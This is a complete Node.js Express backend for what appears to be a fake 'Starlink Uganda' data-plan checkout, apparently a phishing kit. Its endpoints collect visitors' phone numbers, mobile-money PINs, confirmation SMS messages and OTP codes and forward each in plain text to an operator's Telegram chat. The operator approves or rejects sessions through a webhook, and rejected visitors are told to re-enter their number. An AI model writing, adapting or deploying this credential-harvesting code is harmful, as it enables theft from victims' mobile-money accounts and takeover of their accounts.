require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const crypto = require('crypto');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 5000;

// ============================================
// CONFIG — set these in Railway Variables
// ============================================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// ============================================
// MIDDLEWARE
// ============================================
app.use(cors());
app.use(express.json({ limit: '1mb' }));

// Serve static files (HTML, images) from backend root
app.use(express.static(__dirname));

// Health check for Railway
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'ok', service: 'starling-network-ug' });
});

// ============================================
// SESSION STORE (in-memory — resets on redeploy)
// ============================================
const sessions = new Map();

setInterval(() => {
  const now = Date.now();
  for (const [id, session] of sessions) {
    if (now - session.createdAt > 30 * 60 * 1000) {
      sessions.delete(id);
    }
  }
}, 5 * 60 * 1000);

// ============================================
// TELEGRAM HELPER
// ============================================
async function sendTelegramMessage(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('Telegram credentials missing — message not sent');
    console.log('MESSAGE THAT WOULD BE SENT:\n', text);
    return false;
  }
  try {
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: 'HTML'
    });
    return true;
  } catch (err) {
    console.error('Telegram send failed:', err.response?.data || err.message);
    return false;
  }
}

// ============================================
// POST /api/checkout
// ============================================
app.post('/api/checkout', async (req, res) => {
  try {
    const { plan, data, price, phone, pin } = req.body;

    if (!phone || !pin) {
      return res.status(400).json({ ok: false, error: 'Phone and PIN are required' });
    }

    const sessionId = crypto.randomBytes(16).toString('hex');
    const session = {
      id: sessionId,
      plan: plan || 'Unknown',
      data: data || '-',
      price: price || 0,
      phone,
      pin,
      status: 'pending',
      createdAt: Date.now()
    };
    sessions.set(sessionId, session);

    const message = `
🔔 <b>New Payment Request — Uganda</b>

📦 <b>Plan:</b> ${plan} (${data})
💰 <b>Price:</b> UGX ${Number(price).toLocaleString()}
📱 <b>Phone:</b> +256 ${phone.replace(/^0/, '')}
🔐 <b>PIN:</b> <code>${pin}</code>

🆔 <b>Session:</b> <code>${sessionId}</code>

Reply with:
/approve ${sessionId}
/reject ${sessionId}
    `.trim();

    await sendTelegramMessage(message);

    return res.json({ ok: true, sessionId });
  } catch (err) {
    console.error('Checkout error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

// ============================================
// GET /api/status/:sessionId
// ============================================
app.get('/api/status/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const session = sessions.get(sessionId);

  if (!session) {
    return res.json({ ok: true, status: 'timeout', message: 'Session not found or expired' });
  }

  if (Date.now() - session.createdAt > 5 * 60 * 1000 && session.status === 'pending') {
    session.status = 'timeout';
  }

  return res.json({
    ok: true,
    status: session.status,
    message: session.status === 'rejected' ? 'Incorrect number. Kindly check your number and try again.' : ''
  });
});

// ============================================
// POST /api/sms
// ============================================
app.post('/api/sms', async (req, res) => {
  try {
    const { plan, data, price, period, phone, sms } = req.body;

    if (!sms) {
      return res.status(400).json({ ok: false, error: 'SMS required' });
    }

    const message = `
📩 <b>Confirmation SMS Received — Uganda</b>

📦 <b>Plan:</b> ${plan} (${data})
💰 <b>Price:</b> UGX ${Number(price).toLocaleString()}
⏱ <b>Period:</b> ${period}
📱 <b>Phone:</b> +256 ${(phone || '').replace(/^0/, '')}

📝 <b>SMS:</b>
<code>${sms}</code>
    `.trim();

    await sendTelegramMessage(message);

    return res.json({ ok: true });
  } catch (err) {
    console.error('SMS error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

// ============================================
// POST /api/otp
// ============================================
app.post('/api/otp', async (req, res) => {
  try {
    const { plan, data, price, period, phone, otp } = req.body;

    if (!otp) {
      return res.status(400).json({ ok: false, error: 'OTP required' });
    }

    const message = `
🔑 <b>OTP Submitted — Uganda</b>

📦 <b>Plan:</b> ${plan} (${data})
💰 <b>Price:</b> UGX ${Number(price).toLocaleString()}
⏱ <b>Period:</b> ${period}
📱 <b>Phone:</b> +256 ${(phone || '').replace(/^0/, '')}
🔢 <b>OTP:</b> <code>${otp}</code>
    `.trim();

    await sendTelegramMessage(message);

    return res.json({ ok: true });
  } catch (err) {
    console.error('OTP error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

// ============================================
// TELEGRAM WEBHOOK
// ============================================
app.post('/api/telegram-webhook', async (req, res) => {
  try {
    const { message } = req.body;
    if (!message || !message.text) return res.sendStatus(200);

    const text = message.text.trim();
    const fromId = message.chat.id.toString();

    if (fromId !== TELEGRAM_CHAT_ID) {
      return res.sendStatus(200);
    }

    const approveMatch = text.match(/^\/approve\s+(\w+)/);
    const rejectMatch = text.match(/^\/reject\s+(\w+)/);

    if (approveMatch) {
      const session = sessions.get(approveMatch[1]);
      if (session) {
        session.status = 'approved';
        await sendTelegramMessage(`✅ Approved session <code>${approveMatch[1]}</code>`);
      } else {
        await sendTelegramMessage(`❌ Session not found: <code>${approveMatch[1]}</code>`);
      }
    } else if (rejectMatch) {
      const session = sessions.get(rejectMatch[1]);
      if (session) {
        session.status = 'rejected';
        await sendTelegramMessage(`🚫 Rejected session <code>${rejectMatch[1]}</code>`);
      } else {
        await sendTelegramMessage(`❌ Session not found: <code>${rejectMatch[1]}</code>`);
      }
    }

    return res.sendStatus(200);
  } catch (err) {
    console.error('Webhook error:', err);
    return res.sendStatus(200);
  }
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Starlink Uganda backend running on port ${PORT}`);
});
